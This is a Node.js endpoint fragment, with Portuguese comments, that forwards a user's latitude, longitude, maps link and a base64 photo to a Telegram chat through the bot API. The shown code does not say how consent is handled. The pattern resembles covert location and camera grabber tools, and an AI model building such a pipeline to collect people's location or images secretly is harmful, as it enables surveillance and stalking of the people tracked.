const http = require("http");
const https = require("https");

// Dentro do seu endpoint POST:

try {
  // Força IPv4 criando agentes http e https com family 4
  const httpAgent = new http.Agent({ family: 4 });
  const httpsAgent = new https.Agent({ family: 4 });

  // Envia mensagem de localização
  const message = `📍 Localização do usuário:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${maps}`;
  await axios.post(
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    },
    {
      httpAgent,
      httpsAgent,
    }
  );

  if (photo) {
    // Remove o prefixo da base64
    const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    const form = new FormData();
    form.append("chat_id", TELEGRAM_CHAT_ID);
    form.append("photo", buffer, {
      filename: "photo.png",
      contentType: "image/png",
    });

    // Envia foto com os headers corretos e agentes IPv4
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
      form,
      {
        headers: form.getHeaders(),
        httpAgent,
        httpsAgent,
      }
    );
  }

  res.json({ success: true });
} catch (error) {
  console.error("Erro ao enviar para Telegram:", error.response?.data || error.message || error);
  res.status(500).json({ success: false, message: "Erro ao enviar os dados." });
}

